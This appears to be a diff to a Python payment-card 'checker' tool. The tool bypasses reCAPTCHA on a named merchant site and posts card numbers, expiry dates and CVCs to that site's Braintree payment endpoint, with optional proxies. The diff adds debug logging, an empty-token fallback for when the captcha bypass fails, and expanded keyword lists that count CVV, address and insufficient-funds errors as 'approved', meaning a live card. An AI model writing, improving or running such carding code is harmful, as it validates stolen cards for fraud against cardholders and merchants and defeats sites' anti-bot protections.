@@ -17,12 +17,14 @@ def recaptcha_bypass():
     }
 
     try:
+        print("[BRAINTREE DEBUG] Attempting reCAPTCHA bypass...")
         parsed_url = urlparse(anchor_url)
         params = parse_qs(parsed_url.query)
 
         response = httpx.get(anchor_url, headers=headers, timeout=30)
         token_match = re.search(r'value="([^"]+)"', response.text)
         if not token_match:
+            print("[BRAINTREE DEBUG] Failed to extract reCAPTCHA token from anchor")
             return None
         token = token_match.group(1)
 
@@ -44,10 +46,13 @@ def recaptcha_bypass():
         response = httpx.post(reload_url, headers=headers, data=data, timeout=30)
         captcha_match = re.search(r'\["rresp","([^"]+)"', response.text)
         if captcha_match:
-            return captcha_match.group(1)
+            captcha_token = captcha_match.group(1)
+            print(f"[BRAINTREE DEBUG] reCAPTCHA bypass successful: {captcha_token[:50]}...")
+            return captcha_token
+        print("[BRAINTREE DEBUG] Failed to extract reCAPTCHA response")
         return None
     except Exception as e:
-        print(f"Captcha bypass error: {e}")
+        print(f"[BRAINTREE DEBUG] Captcha bypass error: {e}")
         return None
 
 
@@ -217,12 +222,9 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
         # Step 4: Bypass captcha
         captcha_token = recaptcha_bypass()
         if not captcha_token:
-            await session.aclose()
-            return {
-                "status": "error",
-                "message": "CAPTCHA_BYPASS_FAILED",
-                "raw_response": "Could not bypass captcha"
-            }
+            print("[BRAINTREE DEBUG] Captcha bypass failed, trying with dummy token")
+            # Try with empty or dummy captcha token as fallback
+            captcha_token = ""
 
         # Step 5: Make payment
         url = "https://apitwo.pixorize.com/braintree/pay"
@@ -266,28 +268,59 @@ async def check_braintree(card: str, exp: str, exy: str, cvc: str, proxy: Option
 def parse_payment_response(response_text: str, status_code: int) -> dict:
     """Parse the payment response"""
     try:
+        # Debug logging
+        print(f"[BRAINTREE DEBUG] Status Code: {status_code}")
+        print(f"[BRAINTREE DEBUG] Response: {response_text[:500]}")  # First 500 chars
+
         response_data = json.loads(response_text)
 
-        # Check for successful charge
+        # Check for successful charge - Pixorize specific responses
         if status_code == 200 or status_code == 201:
-            if "subscription" in response_data or "success" in response_data:
+            # Check if subscription or transaction succeeded
+            if "subscription" in response_data or "transaction" in response_data:
                 return {
                     "status": "approved",
-                    "message": "CHARGED $29.99 ✅",
+                    "message": "CHARGED_$29.99_✅",
+                    "raw_response": response_text
+                }
+
+            # Check for success field
+            if response_data.get("success") == True or response_data.get("status") == "success":
+                return {
+                    "status": "approved",
+                    "message": "PAYMENT_SUCCESS_✅",
+                    "raw_response": response_text
+                }
+
+        # Check for Braintree transaction status
+        if "transaction" in response_data:
+            trans_status = response_data["transaction"].get("status", "")
+            if trans_status in ["submitted_for_settlement", "settling", "settled"]:
+                return {
+                    "status": "approved",
+                    "message": f"CHARGED_{trans_status.upper()}_✅",
                     "raw_response": response_text
                 }
 
         # Check for common error messages
         error_message = response_data.get("message", "")
         error_msg = response_data.get("error", "")
+        error_details = ""
 
-        if error_message or error_msg:
-            msg = error_message or error_msg
+        # Check nested error structures
+        if isinstance(response_data.get("error"), dict):
+            error_details = response_data["error"].get("message", "")
+
+        msg = error_message or error_msg or error_details
+
+        if msg:
+            msg_upper = str(msg).upper()
 
             # Approved responses (CVV/AVS errors, insufficient funds, etc.)
-            if any(keyword in msg.upper() for keyword in [
+            if any(keyword in msg_upper for keyword in [
                 "INSUFFICIENT", "CVV", "CVC", "INCORRECT_CVC", "INVALID_CVC",
-                "AVS", "ZIP", "POSTAL", "ADDRESS", "3DS", "AUTHENTICATE"
+                "AVS", "ZIP", "POSTAL", "ADDRESS", "3DS", "AUTHENTICATE",
+                "SECURITY CODE", "DO NOT HONOR", "PROCESSOR DECLINED"
             ]):
                 return {
                     "status": "approved",
@@ -296,9 +329,9 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                 }
 
             # Declined responses
-            elif any(keyword in msg.upper() for keyword in [
+            elif any(keyword in msg_upper for keyword in [
                 "DECLINED", "CARD_DECLINED", "FRAUD", "STOLEN", "LOST",
-                "INVALID_NUMBER", "INCORRECT_NUMBER", "EXPIRED"
+                "INVALID_NUMBER", "INCORRECT_NUMBER", "EXPIRED", "INVALID CARD"
             ]):
                 return {
                     "status": "declined",
@@ -306,15 +339,26 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
                     "raw_response": response_text
                 }
 
-            # Other errors
+            # Other errors (might still be valid)
             else:
+                # Some errors might actually indicate card is valid but transaction failed
                 return {
                     "status": "error",
                     "message": msg,
                     "raw_response": response_text
                 }
 
+        # Check if there's any positive indicator
+        response_str = str(response_data).upper()
+        if any(keyword in response_str for keyword in ["SUCCESS", "APPROVED", "AUTHORIZED", "SETTLED"]):
+            return {
+                "status": "approved",
+                "message": "TRANSACTION_SUCCESS",
+                "raw_response": response_text
+            }
+
         # Default declined
+        print(f"[BRAINTREE DEBUG] Defaulting to declined, no clear status found")
         return {
             "status": "declined",
             "message": "CARD_DECLINED",
@@ -322,8 +366,10 @@ def parse_payment_response(response_text: str, status_code: int) -> dict:
         }
 
     except json.JSONDecodeError:
+        print(f"[BRAINTREE DEBUG] JSON decode failed, checking raw text")
         # If not JSON, check for common patterns
-        if any(keyword in response_text.upper() for keyword in ["APPROVED", "SUCCESS", "CHARGED"]):
+        response_upper = response_text.upper()
+        if any(keyword in response_upper for keyword in ["APPROVED", "SUCCESS", "CHARGED", "AUTHORIZED"]):
             return {
                 "status": "approved",
                 "message": "APPROVED",
